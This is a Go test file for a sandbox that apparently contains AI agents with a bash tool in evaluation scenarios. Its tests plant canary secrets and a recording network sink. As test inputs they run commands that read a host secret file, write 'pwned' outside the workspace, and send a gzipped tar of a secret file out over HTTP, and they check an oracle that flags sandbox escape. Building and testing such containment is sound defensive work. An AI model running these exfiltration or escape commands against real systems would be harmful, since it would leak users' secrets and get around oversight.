package world

import (
	"os"
	"strings"
	"testing"
	"time"

	"github.com/41vi4p/avhsol/core/internal/scenario"
)

// These tests run the real avhsol-sandbox binary; they skip when it has not been built.
func sandboxBin(t *testing.T) string {
	t.Helper()
	for _, p := range []string{"../../../guard/target/release/avhsol-sandbox", "../../../guard/target/debug/avhsol-sandbox"} {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	t.Skip("avhsol-sandbox not built (cd guard && cargo build --release -p avhsol-sandbox)")
	return ""
}

func newBox(t *testing.T) (*World, *Sink) {
	t.Helper()
	sc := &scenario.Scenario{
		ID: "t", SystemPrompt: "x", Tools: []string{"bash"}, UserTask: []string{"u"},
		Files: map[string]string{".env": "TOKEN=hf_canaryTESTTOKEN123"},
	}
	sink, err := NewSink()
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(sink.Close)
	hs, err := NewHostSecret()
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(hs.Close)
	w := New(sc)
	if err := w.EnableSandbox(Sandbox{Bin: sandboxBin(t), Timeout: 15 * time.Second}, sink, hs); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(w.Close)
	return w, sink
}

func TestSandboxReadsWorkspaceButNotTheHost(t *testing.T) {
	w, _ := newBox(t)
	if r := w.Call("bash", "1", map[string]any{"command": "cat .env"}); !strings.Contains(r.Content, "hf_canaryTESTTOKEN123") {
		t.Fatalf("workspace file should be readable: %q", r.Content)
	}
	r := w.Call("bash", "2", map[string]any{"command": "cat " + w.HostSecretPath})
	if strings.Contains(r.Content, w.HostCanary) || !strings.Contains(r.Content, "Permission denied") {
		t.Fatalf("host secret must be unreachable: %q", r.Content)
	}
	if e := w.EscapeEvidence(); e != "" {
		t.Fatalf("no escape expected, got %q", e)
	}
}

func TestSandboxBlocksWritesOutsideWorkspace(t *testing.T) {
	w, _ := newBox(t)
	r := w.Call("bash", "1", map[string]any{"command": "echo pwned > " + w.HostSecretPath + " ; echo pwned > /tmp/avhsol-escape-test"})
	if !strings.Contains(r.Content, "Permission denied") {
		t.Fatalf("writes outside the workspace must fail: %q", r.Content)
	}
	if _, err := os.Stat("/tmp/avhsol-escape-test"); err == nil {
		os.Remove("/tmp/avhsol-escape-test")
		t.Fatal("file was written outside the workspace")
	}
	if e := w.EscapeEvidence(); e != "" {
		t.Fatalf("host secret altered: %s", e)
	}
}

func TestEscapeEvidenceDetectsLeakedHostSecret(t *testing.T) {
	w, _ := newBox(t)
	w.Call("bash", "1", map[string]any{"command": "echo hello"})
	w.Log[0].Result = "leaked " + w.HostCanary // simulate a sandbox failure
	if w.EscapeEvidence() == "" {
		t.Fatal("oracle must flag a host secret in bash output")
	}
}

func TestSandboxNetworkOnlyReachesTheSink(t *testing.T) {
	w, sink := newBox(t)
	cmd := "python3 -c \"import urllib.request as u;print(u.urlopen('" + sink.URL() + "/x',data=b'hi',timeout=4).status)\""
	if r := w.Call("bash", "1", map[string]any{"command": cmd}); !strings.Contains(r.Content, "200") {
		t.Fatalf("sink should be reachable: %q", r.Content)
	}
	if len(sink.Hits()) != 1 || sink.Hits()[0].Body != "hi" {
		t.Fatalf("sink should have recorded the request: %+v", sink.Hits())
	}
	r := w.Call("bash", "2", map[string]any{"command": "python3 -c \"import urllib.request as u;u.urlopen('http://127.0.0.1:1/',timeout=3)\" 2>&1 | tail -1"})
	if !strings.Contains(strings.ToLower(r.Content), "permission denied") && !strings.Contains(strings.ToLower(r.Content), "not permitted") {
		t.Fatalf("connect to a non-sink port must be denied by the kernel: %q", r.Content)
	}
	r = w.Call("bash", "3", map[string]any{"command": "python3 -c \"import socket;socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\" 2>&1 | tail -1"})
	if !strings.Contains(strings.ToLower(r.Content), "not permitted") && !strings.Contains(strings.ToLower(r.Content), "permission") {
		t.Fatalf("UDP sockets must be denied: %q", r.Content)
	}
}

func TestBashRefusedWithoutASandbox(t *testing.T) {
	w := New(&scenario.Scenario{ID: "t", SystemPrompt: "x", Tools: []string{"bash"}, UserTask: []string{"u"}})
	if r := w.Call("bash", "1", map[string]any{"command": "echo hi"}); !r.IsError {
		t.Fatal("bash must never run unsandboxed")
	}
}

func TestSinkDecodesGzipBodies(t *testing.T) {
	w, _ := newBox(t)
	w.Call("bash", "1", map[string]any{"command": "echo SECRET-IN-ARCHIVE > f.txt; tar czf - f.txt | python3 -c \"import sys,urllib.request as u;u.urlopen(u.Request('" + w.SinkURL() + "/u',data=sys.stdin.buffer.read(),method='PUT'),timeout=4)\""})
	found := false
	for _, h := range w.SinkHits() {
		if strings.Contains(h.Body, "SECRET-IN-ARCHIVE") {
			found = true
		}
	}
	if !found {
		t.Fatalf("gzip'd tar exfil should be readable at the sink, hits=%d", len(w.SinkHits()))
	}
}
